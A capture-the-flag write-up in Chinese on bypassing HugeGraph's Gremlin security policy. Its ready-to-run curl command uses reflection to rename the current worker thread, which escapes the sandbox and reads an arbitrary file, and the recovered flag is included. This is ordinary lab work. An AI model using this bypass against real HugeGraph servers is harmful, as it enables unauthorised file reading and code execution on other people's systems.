## 题目原文

> 请对目标图数据库服务进行安全测试与漏洞挖掘。

## 题解

### 入口与指纹

服务是 HugeGraph，Gremlin 入口是 `POST /gremlin`。请求体里的 `language` 用 `gremlin-groovy`。

### 关键观察

安全策略会拦住名字以 `gremlin-server-exec` 开头的工作线程。当前线程正好是这个名字。线程对象的 `name` 字段可以通过反射改掉，改完之后同一个请求里就能读文件。

### 利用链

把当前线程改名为 `not-a-worker`，再读 `/challenge/flag.txt`：

```bash
T=$(head -1 .target)
curl -sS --compressed -H 'Content-Type: application/json' \
  --data-binary '{"gremlin":"def t = Thread.currentThread()\ndef f = t.getClass().getDeclaredField(\"name\")\nf.setAccessible(true)\nf.set(t, \"not-a-worker\")\nreturn new File(\"/challenge/flag.txt\").getText()","bindings":{},"language":"gremlin-groovy","aliases":{}}' \
  "http://$T/gremlin"
```

本次返回 `flag{a7daed15-830a-4b11-b729-e1072f1b5e40}`。平台接受。

### flag 位置

`/challenge/flag.txt`。它不在图数据里。
